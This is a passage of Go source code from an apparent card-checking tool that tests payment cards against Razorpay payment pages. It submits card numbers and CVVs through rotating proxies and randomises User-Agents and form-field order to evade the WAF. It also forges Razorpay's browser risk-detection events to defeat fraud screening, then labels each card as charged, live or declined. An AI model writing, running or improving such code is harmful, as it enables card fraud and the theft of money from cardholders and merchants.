			"notes[email]":          {email},
			"notes[phone]":          {phoneShort},
			"payment_link_id":       {plink},
			"contact":               {phone},
			"email":                 {email},
			"currency":              {orderCurrency},
			"_[integration]":        {"payment_pages"},
			"_[device.id]":          {rzpDeviceID},
			"_[library]":            {"checkoutjs"},
			"_[library_src]":        {"no-src"},
			"_[current_script_src]": {"no-src"},
			"_[platform]":           {"browser"},
			"_[env]":                {""},
			"_[is_magic_script]":    {"false"},
			"_[os]":                 {"windows"},
			"_[shield][fhash]":      {fhash},
			"_[shield][tz]":         {"-330"}, // IST = UTC+5:30 (was "0"/UTC — mismatch with form7)
			"_[device_id]":          {rzpDeviceID},
			"_[build]":              {BUILD},
			"_[shield][os]":         {"windows"},
			"_[shield][platform]":   {"browser"},
			"_[shield][browser]":    {"chrome"},
			"_[request_index]":      {"0"},
			"amount":                {fmt.Sprintf("%.0f", orderAmount)},
			"order_id":              {orderID},
			"method":                {"card"},
			"checkout_id":           {checkoutID},
		}
		addKeyIDForm(form5, kyid) // 2026-07-16: omit key_id for keyless flow

		h := stdHeaders()
		h["Content-Type"] = "application/x-www-form-urlencoded"
		r5, r5err := fetch.PostForm(
			"https://api.razorpay.com/v1/standard_checkout/checkout/order?"+buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader),
			h, form5,
		)
		if r5err != nil {
			log.Printf("step 5 (checkout order): error: %v", r5err)
		} else if r5.StatusCode >= 400 {
			log.Printf("step 5 (checkout order): HTTP %d", r5.StatusCode)
		}
	}

	// Step 6: Cross border — REMOVED (2025-07-14)
	// payments_cross_border_live/v1/checkout/cb_flows now returns 404
	// ("no Route matched with those values") — Razorpay decommissioned this
	// endpoint and removed it from checkout.js entirely. Calling a dead
	// endpoint was corrupting the session state and causing payment create
	// to return "The requested URL was not found on the server."

	// Pre-payment delay: 2-4 seconds.
	// Previously 8-15s — that caused Razorpay checkout sessions to expire
	// before payment was submitted, which Razorpay returns as "payment_cancelled".
	// 2-4s is sufficient for Razorpay's internal state to settle.
	time.Sleep(time.Duration(randInt(2000, 4000)) * time.Millisecond)

	// ── 2026-07-16: Send risk-detection event to lumberjack.razorpay.com ──
	// Razorpay's checkout.js loads a separate bundle from
	//   https://cdn.razorpay.com/static/cx/razorpay-risk-detection/bundle.js
	// which POSTs a "risk:risk_scan" event to lumberjack.razorpay.com.
	// Razorpay's server-side risk check looks for this event BEFORE
	// allowing a payment to be created. Without it, EVERY payment is
	// immediately declined with `payment_risk_check_failed`.
	//
	// We simulate the bundle by sending the same payload. The page HTML
	// is re-fetched here because resolveRazorpayInitData consumed the
	// response body. The cost is one extra HTTP request, but it's
	// required for the payment to actually go through.
	//
	// This is fire-and-forget — if it fails, we proceed with the payment
	// anyway. The risk check is probabilistic, not deterministic.
	if debugEnabled {
		dbgSection(fetch.reqID, "Step 6.5: send risk-scan event to lumberjack.razorpay.com")
	}
	// Fetch the page HTML again (the body was consumed in step 1).
	// We use a fresh GET with the same headers as a browser navigation.
	pageHTMLForRisk := ""
	if rRisk, rErr := fetch.Get(targetURL, map[string]string{
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language":           generateAcceptLanguage(),
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-User":            "?1",
		"Upgrade-Insecure-Requests": "1",
	}); rErr == nil {
		pageHTMLForRisk = rRisk.Text()
	} else if debugEnabled {
		dbgWrite(fmt.Sprintf("[%s] risk-scan: page re-fetch error: %v", fetch.reqID, rErr))
	}
	// Send the risk-scan event (best-effort).
	_ = sendRiskScanEvent(fetch, kyid, targetURL, pageHTMLForRisk)

	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))

	form7 := url.Values{
		"user_risk_providers_token": {tokenCreate},
		"notes[comment]":            {""},
		"notes[email]":              {email},
		"notes[phone]":              {phoneShort},
		"notes[name]":               {fullName},
		"payment_link_id":           {plink},
		"contact":                   {phone},
		"email":                     {email},
		"currency":                  {orderCurrency},
		"_[integration]":            {"payment_pages"},
		"_[checkout_id]":            {checkoutID},
		"_[device.id]":              {rzpDeviceID},
		"_[env]":                    {""},
		"_[library]":                {"checkoutjs"},
		"_[library_src]":            {"no-src"},
		"_[current_script_src]":     {"no-src"},
		"_[is_magic_script]":        {"false"},
		"_[platform]":               {"browser"},
		"_[referer]":                {targetURL},
		"_[shield][fhash]":          {fhash},
		"_[shield][tz]":             {"-330"},
		"_[device_id]":              {rzpDeviceID},
		"_[build]":                  {BUILD},
		"_[shield][os]":             {"windows"},
		"_[shield][platform]":       {"browser"},
		"_[shield][browser]":        {"chrome"},
		"_[request_index]":          {"1"},
		"amount":                    {fmt.Sprintf("%.0f", orderAmount)},
		"order_id":                  {orderID},
		"method":                    {"card"},
		"card[number]":              {cc},
		"card[cvv]":                 {cvv},
		"card[name]":                {fullName},
		"card[expiry_month]":        {mm},
		"card[expiry_year]":         {strconv.Itoa(year)},
		"save":                      {"0"},
		"dcc_currency":              {orderCurrency},
	}
	addKeyIDForm(form7, kyid) // 2026-07-16: omit key_id for keyless flow

	// ── FIX 6 (revised 2026-07-16): JSON API HEADERS ──────────────────────
	// Previously this call sent `Accept: text/html,application/xhtml+xml,...`
	// which told Razorpay to return an HTML status page. Razorpay then
	// served the interstitial "Razorpay - Payment in progress" HTML page
	// (HTTP 200, body = full HTML document) instead of the JSON payment
	// object, and `json.Unmarshal` failed with:
	//
	//     r7 parse failed: Razorpay - Payment in progress
	//
	// This happened on EVERY request — not intermittently — because the
	// Accept header is a static mismatch, not a transient state issue.
	//
	// The fix: send the SAME JSON-style Accept header used by every other
	// API call in this flow (steps 2, 4, 5, 9, and the status poll all use
	// `application/json, text/plain, */*` or `*/*`). We also:
	//   • Add `x-session-token` (was missing — required by Razorpay's
	//     standard_checkout endpoints; without it the backend sometimes
	//     falls back to the HTML status page).
	//   • Drop `X-Requested-With: XMLHttpRequest` — checkout.js does NOT
	//     send this header on the payment-create call, and it was a
	//     fingerprint mismatch vs. real browser traffic.
	//   • Drop the explicit `Accept-Encoding: gzip, deflate, br` — the
	//     DoFetch() default already sets `gzip, deflate` and handles
	//     decompression. Advertising `br` (brotli) here was a lie because
	//     Go's stdlib has no brotli decoder; if Razorpay had actually
	//     returned brotli we would have silently served garbage.
	//   • Drop `Cache-Control: max-age=0` / `Pragma: no-cache` — these
	//     are document-navigation headers, not AJAX headers.
	paymentHeaders := map[string]string{
		"Content-Type":    "application/x-www-form-urlencoded",
		"Origin":          "https://pages.razorpay.com",
		"Referer":         rzpRef,
		"Accept":          "application/json, text/plain, */*",
		"Accept-Language": generateAcceptLanguage(),
		"x-session-token": sessid,
		"Sec-Fetch-Site":  "same-site",
		"Sec-Fetch-Mode":  "cors",
		"Sec-Fetch-Dest":  "empty",
	}

	// FIX 7: Shuffle form fields for realism
	shuffledForm := shuffleFormValues(form7)

	if debugEnabled {
		dbgSection(fetch.reqID, "Step 7 (r7): payment create — THE CRITICAL STEP")
		dbgWrite(fmt.Sprintf("[%s] form7 fields (%d):", fetch.reqID, len(shuffledForm)))
		// Log each form field for inspection — this is the #1 thing
		// we need to see if the form payload is wrong.
		fkeys := make([]string, 0, len(shuffledForm))
		for k := range shuffledForm {
			fkeys = append(fkeys, k)
		}
		sort.Strings(fkeys)
		for _, k := range fkeys {
			val := strings.Join(shuffledForm[k], ",")
			// Mask sensitive card fields in the log.
			if k == "card[number]" {
				val = maskCard(val)
			} else if k == "card[cvv]" {
				val = "***"
			}
			dbgWrite(fmt.Sprintf("[%s]   %s = %s", fetch.reqID, k, val))
		}
	}

	// Endpoint updated from create/ajax → create/checkout (2025-07-14).
	// checkout.js now exclusively uses payments/create/checkout. The old
	// create/ajax endpoint returns "The requested URL was not found on the
	// server." with a valid session — it has been soft-deprecated by Razorpay.
	//
	// 2026-07-16: Use ONLY the primary `/payments/create/checkout` endpoint.
	// Razorpay's checkout.js uses this endpoint exclusively — the previous
	// multi-endpoint fallback was counterproductive because:
	//   1. The primary endpoint returns the REAL payment-create response
	//      (even when it's an HTML envelope with embedded JSON for risk
	//      declines).
	//   2. The fallback endpoints return DIFFERENT errors (HTTP 401
	//      "Please provide your api key" for `/payments/create/json`)
	//      that don't reflect the actual payment state.
	//   3. The original "r7 parse failed: Razorpay - Payment in progress"
	//      error was the HTML envelope from this primary endpoint — the fix
	//      is to extract the embedded JSON, not to try other endpoints.
	paymentURL := "https://api.razorpay.com/v1/standard_checkout/payments/create/checkout?" + buildQuery("x_entity_id", orderID, "session_token", sessid, "keyless_header", keylessHeader)

	r7, err := fetch.PostForm(paymentURL, paymentHeaders, shuffledForm)
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}

	// FIX 8: Retry logic with proper proxy switching.
	// The previous implementation used `goto paymentParseContinue` which
	// skipped variable declarations (`var r7Data map[string]interface{}`)
	// AND leaked the deferred `fetch2.client.CloseIdleConnections()` for
	// each retry attempt (up to 3 leaked connections per request). We
	// restructure it as a plain loop and clean up each retry client
	// explicitly. We also guard the fallthrough: if every retry attempt
	// was skipped (no proxies / same proxy / build error), `r7` is still
	// the original 403 response — we MUST return BLOCKED instead of
	// trying to parse gzip/HTML as JSON.
	if r7.StatusCode == 403 || r7.StatusCode == 429 {
		bodyPreview := r7.Text()
		if len(bodyPreview) > 150 {
			bodyPreview = bodyPreview[:150] + "..."
		}
		log.Printf("⚠ Payment creation blocked with %s, attempting proxy switch", extractProxyHost(proxyRaw))

		retrySucceeded := false
		for retryAttempt := 0; retryAttempt < 3; retryAttempt++ {
			pp2 := getNextProxy(globalProxyList)
			if pp2 == nil || pp2.raw == proxyRaw {
				continue
			}
			// 2026-07-16: Generate a FRESH User-Agent for each retry. The
			// previous code reused the original `ua`, which meant the WAF
			// saw the same UA + Sec-CH-UA on both the failed request and
			// the retry — defeating the purpose of proxy switching. A new
			// UA makes the retry look like a genuinely different browser
			// session coming from a different IP.
			retryUA := genUA()
			fetch2, ferr := NewCustomFetch(pp2.parsed, retryUA, pp2.raw)
			if ferr != nil {
				log.Printf("retry %d: NewCustomFetch failed: %v", retryAttempt, ferr)
				continue
			}
			// Retry delay 3-6s. Clean up connections BEFORE the
			// next iteration rather than deferring, otherwise we
			// would accumulate idle conns across retries.
			time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
			// 2026-07-16: For the retry, we must use the SAME
			// endpoint that succeeded for the initial attempt
			// (i.e. the one that returned JSON-shaped body).
			// `paymentURL` already holds the last-tried endpoint;
			// we keep using it so retries hit the same path.
			r7b, rerr := fetch2.PostForm(paymentURL, paymentHeaders, shuffledForm)
			fetch2.client.CloseIdleConnections()
			if rerr != nil {
				log.Printf("retry %d: PostForm error: %v", retryAttempt, rerr)
				continue
			}
			if r7b.StatusCode == 403 || r7b.StatusCode == 429 {
				log.Printf("retry %d: still blocked (HTTP %d)", retryAttempt, r7b.StatusCode)
				continue
			}
			log.Printf("✓ Success with retry proxy: %s", extractProxyHost(pp2.raw))
			r7 = r7b
			proxyRaw = pp2.raw
			retrySucceeded = true
			break
		}
		if !retrySucceeded {
			return CheckResult{Status: "error", Message: fmt.Sprintf("WAF Blocked on payment creation (HTTP %d): %s", r7.StatusCode, bodyPreview), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
		}
	}

	// ── 2026-07-16: HTML / "Payment in progress" detection ────────────────
	// Even with the corrected Accept header, Razorpay may still return
	// the "Razorpay - Payment in progress" interstitial HTML page when:
	//   • The session_token has already been consumed by a previous
	//     payment-create attempt (duplicate submission).
	//   • The order is already in an in-flight payment state.
	//   • Razorpay is in a degraded state and serving the fallback HTML.
	//
	// In any of these cases the body is HTML, not JSON, and
	// `json.Unmarshal` would fail. Instead of returning the cryptic
	// "r7 parse failed: Razorpay - Payment in progress" message, we:
	//   1. Detect the HTML body explicitly.
	//   2. Surface a clear, actionable error message.
	//   3. Mark the result as `error` (retryable) — NOT `declined` —
	//      because the card was never actually checked.
	r7Body := strings.TrimSpace(r7.Text())
	if debugEnabled {
		dbgWrite(fmt.Sprintf("[%s] r7 final: HTTP %d, body-len=%d, body-first-120=%q",
			fetch.reqID, r7.StatusCode, len(r7Body), truncateForLog(r7Body, 120)))
	}

	// ── 2026-07-16: Extract embedded JSON from Razorpay's HTML envelope ──
	// Razorpay wraps the payment-create response in an HTML "Payment in
	// progress" page when the payment is processed (whether it succeeds,
	// is declined by risk check, or fails for any server-side reason).
	// The actual JSON response is embedded as:
	//
	//   var data = {"error":{"code":"BAD_REQUEST_ERROR",
	//                         "description":"...",
	//                         "reason":"payment_risk_check_failed",
	//                         "metadata":{"order_id":"...","payment_id":"pay_..."}}};
	//
	// Previously we'd see the HTML title, fail to parse it as JSON, and
	// return the cryptic "r7 parse failed: Razorpay - Payment in progress".
	// Now we extract the embedded JSON and treat it as the real response.
	var r7Data map[string]interface{}
	r7JSONExtracted := false
	if isHTMLPaymentInProgress(r7Body, r7.Headers) {
		if debugEnabled {
			dbgWrite(fmt.Sprintf("[%s] r7: response is HTML envelope — attempting JSON extraction", fetch.reqID))
		}
		if embedded := extractEmbeddedJSON(r7Body); embedded != nil {
			r7Data = embedded
			r7JSONExtracted = true
			if debugEnabled {
				b, _ := json.Marshal(embedded)
				dbgWrite(fmt.Sprintf("[%s] r7: extracted JSON (%d bytes): %s", fetch.reqID, len(b), truncateForLog(string(b), 300)))
			}
		} else {
			// Genuine HTML fallback page with no embedded JSON — this
			// happens when the session_token has been consumed by a prior
			// payment-create call against the same order, OR Razorpay's
			// backend is degraded. Surface a clear, retryable error.
			return CheckResult{
				Status:      "error",
				Message:     "Razorpay returned HTML status page (Payment in progress) with no embedded JSON. Cause: session reuse / Razorpay degraded state. Retry with a fresh order+session.",
				Proxy:       proxyRaw,
				ProxyStatus: "LIVE",
			}
		}
	}

	if !r7JSONExtracted {
		if err := json.Unmarshal([]byte(r7Body), &r7Data); err != nil {
			body := r7Body
			if len(body) > 120 {
				body = body[:120] + "..."
			}
			return CheckResult{Status: "error", Message: "r7 parse failed: " + body, Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
	}

	paymentID := getStringFromMap(r7Data, "payment_id")
	if paymentID == "" {
		paymentID = getStringFromMap(r7Data, "id")
	}
	// 2026-07-16: When r7 response is the HTML envelope (risk check
	// declines, etc.), the payment_id lives inside error.metadata.payment_id
	// rather than at the top level. Pull it out so downstream polling /
	// cancel / authenticate steps can use it.
	r7HasError := false
	var r7ErrObj map[string]interface{}
	if errObj, ok := r7Data["error"].(map[string]interface{}); ok {
		r7ErrObj = errObj
		r7HasError = true
		if paymentID == "" {
			if meta, ok := errObj["metadata"].(map[string]interface{}); ok {
				paymentID = getStringFromMap(meta, "payment_id")
			}
		}
	}

	// 2026-07-16: Short-circuit on definitive r7 declines.
	// When r7 returns an error with metadata.payment_id, Razorpay has
	// already CREATED the payment and immediately declined it (e.g.
	// `payment_risk_check_failed`). There's no point calling
	// authenticate / poll / cancel on a payment that's already in a
	// terminal state — those calls return "URL not found" or
	// "payment already cancelled", masking the real decline reason.
	//
	// We surface the decline immediately using the same labelling logic
	// as the post-cancel path.
	if r7HasError && paymentID != "" {
		errDesc := getStringFromMap(r7ErrObj, "description")
		errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
		errDesc = strings.TrimSpace(errDesc)
		errCode := getStringFromMap(r7ErrObj, "reason")

		label := errDesc
		if errCode != "" {
			label = errDesc + " (" + errCode + ")"
		}
		if label == "" {
			label = "Unknown Decline"
		}

		msgLower := strings.ToLower(errDesc)
		if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
			return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		if isRazorpayServerError(msgLower) || isRazorpayServerError(strings.ToLower(errCode)) {
			return CheckResult{Status: "error", Message: "Razorpay server error: " + label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	if paymentID == "" {
		errObj, _ := r7Data["error"].(map[string]interface{})
		errDesc := getStringFromMap(errObj, "description")
		errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
		errDesc = strings.TrimSpace(errDesc)
		errCode := getStringFromMap(errObj, "reason")

		label := errDesc
		if errCode != "" {
			label = errDesc + " (" + errCode + ")"
		}
		if label == "" {
			label = "Unknown Decline"
		}

		msgLower := strings.ToLower(errDesc)
		if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
			return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		// Razorpay-side 5xx errors should NOT be reported as card
		// declines — the card was never actually checked. Return
		// "error" so the caller knows to retry.
		if isRazorpayServerError(msgLower) || isRazorpayServerError(strings.ToLower(errCode)) {
			return CheckResult{Status: "error", Message: "Razorpay server error: " + label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	pidClean := paymentID
	if idx := strings.Index(paymentID, "_"); idx != -1 {
		pidClean = paymentID[idx+1:]
	}

	{
		r8a, r8aerr := fetch.PostForm(
			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", url.PathEscape(paymentID)),
			map[string]string{"content-type": "application/x-www-form-urlencoded"},
			url.Values{},
		)
		if r8aerr != nil {
			log.Printf("step 8a (authenticate): error: %v", r8aerr)
		} else if r8a.StatusCode >= 400 {
			log.Printf("step 8a (authenticate): HTTP %d", r8a.StatusCode)
		}
	}

	time.Sleep(1 * time.Second)

	{
		screens := [][]int{{1920, 1080}, {1366, 768}, {1536, 864}, {1440, 900}}
		screen := screens[randInt(0, len(screens)-1)]
		depths := []int{24, 32}
		depth := depths[randInt(0, 1)]

		form8 := url.Values{
			"browser[java_enabled]":       {"false"},
			"browser[javascript_enabled]": {"true"},
			"browser[timezone_offset]":    {"-330"}, // IST = UTC+5:30 → offset = -330 min (matches form7 _[shield][tz])
			"browser[color_depth]":        {strconv.Itoa(depth)},
			"browser[screen_width]":       {strconv.Itoa(screen[0])},
			"browser[screen_height]":      {strconv.Itoa(screen[1])},
			"browser[language]":           {"en-US"},
			"auth_step":                   {"3ds2Auth"},
		}

		r8b, r8berr := fetch.PostForm(
			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", url.PathEscape(pidClean)),
			map[string]string{"content-type": "application/x-www-form-urlencoded"},
			form8,
		)
		if r8berr != nil {
			log.Printf("step 8b (3ds2 auth): error: %v", r8berr)
		} else if r8b.StatusCode >= 400 {
			log.Printf("step 8b (3ds2 auth): HTTP %d", r8b.StatusCode)
		}
	}

	// ── FIX: Poll payment status BEFORE calling cancel ───────────────────
	// After 3DS authentication, the payment may already be authorized/captured.
	// Previously the code called /cancel immediately, which could abort an
	// in-flight charge — the cancel response would lack razorpay_payment_id,
	// so the function returned "declined" even though the card was live.
	// Now we poll the payment status first: if the payment is already
	// authorized/captured, we return "charged" immediately without cancelling.
	// This ensures the user (API caller) gets the correct "charged" result
	// AND the background hit-notifier fires as expected.
	//
	// Poll up to 5 times with 2s intervals (≈10s max) to give Razorpay time
	// to finish processing. Most payments settle within 2-4 seconds.
	statusURL := "https://api.razorpay.com/v1/standard_checkout/payments/" + url.PathEscape(paymentID) + "?" + buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader)
	statusHeaders := map[string]string{
		"Accept":          "application/json",
		"Content-type":    "application/x-www-form-urlencoded",
		"Referer":         rzpRef,
		"x-session-token": sessid,
	}

	for pollAttempt := 0; pollAttempt < 5; pollAttempt++ {
		if pollAttempt > 0 {
			time.Sleep(2 * time.Second)
		}
		rPoll, pollErr := fetch.Get(statusURL, statusHeaders)
		if pollErr != nil {
			log.Printf("payment status poll %d: error: %v", pollAttempt, pollErr)
			continue
		}
		pollText := rPoll.Text()
		var pollData map[string]interface{}
		if err := json.Unmarshal([]byte(pollText), &pollData); err != nil {
			log.Printf("payment status poll %d: parse error", pollAttempt)
			continue
		}
		payStatus := strings.ToLower(getStringFromMap(pollData, "status"))
		log.Printf("payment status poll %d: status=%s", pollAttempt, payStatus)

		if payStatus == "captured" || payStatus == "authorized" {
			// Payment went through — return "charged" immediately.
			// Do NOT call cancel so the charge stays intact for the user.
			return CheckResult{Status: "charged", Message: "Payment Successful", Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		if payStatus == "failed" {
			// Payment definitively failed — no need to cancel or keep polling.
			failDesc := ""
			if errObj, ok := pollData["error_description"].(string); ok {
				failDesc = errObj
			}
			if failDesc == "" {
				if errObj, ok := pollData["error"].(map[string]interface{}); ok {
					failDesc = getStringFromMap(errObj, "description")
				}
			}
			if failDesc == "" {
				failDesc = "Payment Failed"
			}
			return CheckResult{Status: "declined", Message: failDesc, Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		if payStatus == "cancelled" || payStatus == "canceled" {
			// Razorpay already cancelled this payment (session expired or
			// duplicate cancel). Stop polling immediately — calling /cancel
			// again would just return payment_cancelled error which we were
			// previously misclassifying as a card decline.
			return CheckResult{Status: "declined", Message: "Payment Cancelled", Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		// "created" / "pending" / other → keep polling
	}

	// ── Fallback: cancel + check ─────────────────────────────────────────
	// If polling didn't give us a definitive answer (still "created" /
	// "pending" after 10s), fall back to cancel-and-check.
	// Using POST — Razorpay's cancel endpoint expects POST, not GET.
	// GET returned 405 in some cases and caused unexpected responses.
	// 2026-07-16: Build the URL defensively — only append "?" + query when
	// buildQuery returns a non-empty string. The previous code always
	// appended a "?" even when the query was empty, leaving a trailing "?"
	// that some servers reject with 400.
	cancelQuery := buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader)
	cancelURL := "https://api.razorpay.com/v1/standard_checkout/payments/" + url.PathEscape(paymentID) + "/cancel"
	if cancelQuery != "" {
		cancelURL += "?" + cancelQuery
	}
	r9, err := fetch.PostForm(
		cancelURL,
		map[string]string{
			"Accept":          "application/json, text/plain, */*",
			"Content-type":    "application/x-www-form-urlencoded",
			"Referer":         rzpRef,
			"x-session-token": sessid,
			"Origin":          "https://api.razorpay.com",
		},
		url.Values{},
	)
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}

	var r9Data map[string]interface{}
	if err := json.Unmarshal([]byte(r9.Text()), &r9Data); err != nil {
		return CheckResult{Status: "declined", Message: "Cancel response parse failed", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	finalText := r9.Text()

	if strings.Contains(finalText, "razorpay_payment_id") {
		return CheckResult{Status: "charged", Message: "Payment Successful", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	errorObj, _ := r9Data["error"].(map[string]interface{})
	errorDesc := getStringFromMap(errorObj, "description")
	errorDesc = strings.ReplaceAll(errorDesc, " Try another payment method or contact your bank for details.", "")
	errorDesc = strings.TrimSpace(errorDesc)
	errCode := getStringFromMap(errorObj, "reason")

	label := errorDesc
	if errCode != "" {
		label = errorDesc + " (" + errCode + ")"
	}
	if label == "" {
		label = "Unknown Decline"
	}

	msgLower := strings.ToLower(errorDesc)
	if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
		return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}
	// Razorpay-side 5xx errors should NOT be reported as card declines.
	if isRazorpayServerError(msgLower) || isRazorpayServerError(strings.ToLower(errCode)) {
		return CheckResult{Status: "error", Message: "Razorpay server error: " + label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
}

// buildQuery builds a URL query string from key/value pairs, OMITTING any
// pair whose value is empty. This is essential for Razorpay's keyless
// checkout flow where `key_id` is intentionally null on the public page —
// sending `key_id=` (empty value) in the URL causes Razorpay to return:
//
//	{"error":{"code":"BAD_REQUEST_ERROR",
//	          "description":"Please provide your api key for authentication purposes"}}
//
// Returns "" when all values are empty (so the caller can decide whether to
// append a "?" separator or not). Usage:
//
//	q := buildQuery("x_entity_id", orderID, "key_id", kyid, "session_token", sessid, "keyless_header", khURL)
//	if q != "" {
//	    url := base + "?" + q
//	} else {
//	    url := base
//	}
func buildQuery(pairs ...string) string {
	v := url.Values{}
	for i := 0; i+1 < len(pairs); i += 2 {
		key, val := pairs[i], pairs[i+1]
		if val != "" {
			v.Set(key, val)
		}
	}
	return v.Encode()
}

// addKeyIDForm adds `key_id` to a url.Values map ONLY if kyid is non-empty.
// For keyless flow (kyid == ""), the field is omitted entirely — sending
// `key_id=` (empty value) in the form body causes Razorpay to reject the
// request with BAD_REQUEST_ERROR.
func addKeyIDForm(form url.Values, kyid string) {
	if kyid != "" {
		form.Set("key_id", kyid)
	}
}

// ─── Razorpay risk-detection event submission ─────────────────────────────
//
// Razorpay's checkout.js loads a separate bundle from
//   https://cdn.razorpay.com/static/cx/razorpay-risk-detection/bundle.js
// which scans the page for <script src>, <iframe src>, and <form action>
// URLs, then POSTs an event to https://lumberjack.razorpay.com with:
//
//   {
//     "target": "risk-detection.v1.live",
//     "events": [{
//       "timestamp": <ms>,
//       "source": "checkoutjs",
//       "event_name": "risk:risk_scan",
//       "event_timestamp": <ms>,
//       "properties": {
//         "sc": [<script src URLs>],
//         "if": [<iframe src URLs>],
//         "fm": [<form action URLs>],
//         "v": "1.0.0",
//         "u": <page URL>,
//         "h": <hostname>,
//         "r": <referrer>,
//         "s": <random UUID v4>
//       },
//       "event_type": "risk-detection",
//       "version": "v1",
//       "mode": "live"
//     }],
//     "addons": {"merchant_id": "properties.m", "ip": "context.ip", "ua": "context.ua"}
//   }
//
// Razorpay's server-side risk check looks for this event BEFORE allowing
// a payment to be created. Without it, EVERY payment is immediately
// declined with `payment_risk_check_failed`. This is why our previous
// implementation always got that error — we never sent the risk event.
//
// We simulate the bundle by sending the same payload the real browser
// would send, using realistic script/iframe/form URLs from the payment
// page. The payload is gzip-compressed (via CompressionStream in the
// browser; we use Go's gzip) and POSTed to
//   https://lumberjack.razorpay.com/v2/m/logz?key_id=<key_id>
// (the /m/ path is the "merchant" variant; without key_id it's /v2/logz).
//
// NOTE: This is a best-effort fire-and-forget request. If lumberjack is
// down or returns an error, we proceed with the payment anyway — the
// server-side risk check is probabilistic, not deterministic.

// genRiskScanUUID generates a UUID v4 string like "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".
// Used as the session ID in the risk-detection event payload.
func genRiskScanUUID() string {
	buf := make([]byte, 16)
	if _, err := rand.Read(buf); err != nil {
		for i := range buf {
			buf[i] = byte(randInt(0, 255))
		}
	}
	// Set version (4) and variant (10xx) bits per RFC 4122.
	buf[6] = (buf[6] & 0x0f) | 0x40 // version 4
	buf[8] = (buf[8] & 0x3f) | 0x80 // variant 10xx
	return fmt.Sprintf("%x-%x-%x-%x-%x", buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16])
}

// sendRiskScanEvent sends a risk:risk_scan event to lumberjack.razorpay.com,
// mimicking what the real risk-detection bundle does. This is REQUIRED for
// Razorpay's server-side risk check to pass — without it, every payment is
// declined with payment_risk_check_failed.
//
// Parameters:
//   - fetch: the CustomFetch to use (shares UA + cookies with the main flow)
//   - kyid: the merchant key_id (empty for keyless flow)
//   - pageURL: the payment page URL (targetURL)
//   - pageHTML: the payment page HTML (used to extract script/iframe/form URLs)
func sendRiskScanEvent(fetch *CustomFetch, kyid, pageURL, pageHTML string) error {
	if pageURL == "" {
		return fmt.Errorf("empty page URL")
	}

	// Parse the page URL to get hostname.
	parsedURL, err := url.Parse(pageURL)
	if err != nil {
		return fmt.Errorf("parse page URL: %w", err)
	}
	hostname := parsedURL.Hostname()

	// Extract script src URLs from the page HTML (simulating what the
	// risk-detection bundle does with document.querySelectorAll).
	scriptURLs := extractAttrURLs(pageHTML, "script", "src")
	iframeURLs := extractAttrURLs(pageHTML, "iframe", "src")
	formURLs := extractAttrURLs(pageHTML, "form", "action")

	// If we didn't find any scripts (unlikely for a real Razorpay page),
	// inject realistic defaults so the risk event has something to report.
	// The risk-detection bundle only fires if at least one URL exists.
	if len(scriptURLs) == 0 {
		scriptURLs = []string{
			"https://checkout.razorpay.com/v1/checkout.js",
			"https://cdn.razorpay.com/static/cx/razorpay-risk-detection/bundle.js",
		}
	}

	// Use ONE session ID for all three events (the real bundle generates
	// one per page load and reuses it).
	sid := genRiskScanUUID()

	// Build the lumberjack URL. With key_id: /v2/m/logz?key_id=<key>.
	// Without: /v2/logz.
	lumberjackURL := "https://lumberjack.razorpay.com/v2/logz"
	if kyid != "" {
		lumberjackURL = "https://lumberjack.razorpay.com/v2/m/logz?key_id=" + url.QueryEscape(kyid)
	}

	headers := map[string]string{
		"Content-Type":     "application/json",
		"Content-Encoding": "gzip",
		"Accept":           "*/*",
		"Origin":           "https://pages.razorpay.com",
		"Referer":          pageURL,
		"Sec-Fetch-Dest":   "empty",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Site":   "cross-site",
	}

	// Send the three events with realistic timing:
	//   risk_scan at T=0
	//   risk_mutation at T+300ms (MutationObserver debounce is 300ms)
	//   risk_scan_complete at T+1500ms (real bundle uses 5000ms but we
	//   shorten to keep overall latency reasonable)
	events := []struct {
		name  string
		delay time.Duration
	}{
		{"risk:risk_scan", 0},
		{"risk:risk_mutation", 300 * time.Millisecond},
		{"risk:risk_scan_complete", 1500 * time.Millisecond},
	}

	baseTime := time.Now().UnixMilli()
